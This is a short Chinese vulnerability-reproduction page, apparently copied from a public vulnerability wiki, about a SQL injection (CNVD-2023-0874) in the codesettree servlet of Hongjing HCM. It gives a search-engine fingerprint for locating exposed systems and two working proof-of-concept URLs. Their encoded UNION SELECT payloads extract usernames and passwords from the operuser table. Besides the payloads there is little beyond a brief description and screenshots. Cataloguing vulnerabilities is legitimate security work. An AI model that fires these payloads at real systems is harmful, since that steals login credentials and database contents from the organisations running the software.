---
title: "宏景 HCM codesettree SQL注入漏洞 CNVD-2023-0874"
date: 2026-10-16 09:10:39
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "宏景-HCM-codesettree"
tags:
  - "宏景-HCM-codesettree"
  - "SQL注入"
  - "CNVD-2023-0874"
  - "漏洞复现"
---
## 漏洞描述

宏景 HCM codesettree 接口存在SQL注入漏洞，攻击者通过漏洞可以获取到登陆系统的账号密码和数据库信息

## 漏洞影响

宏景 HCM

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

登陆页面

![image-20230704113309837](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230704113309837.png)

验证POC

```
/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d
/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cpassword~20from~20operuser~20~2d~2d
```

![image-20230704113329354](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230704113329354.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E5%AE%8F%E6%99%AF-HCM-codesettree-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CNVD-2023-0874.md)
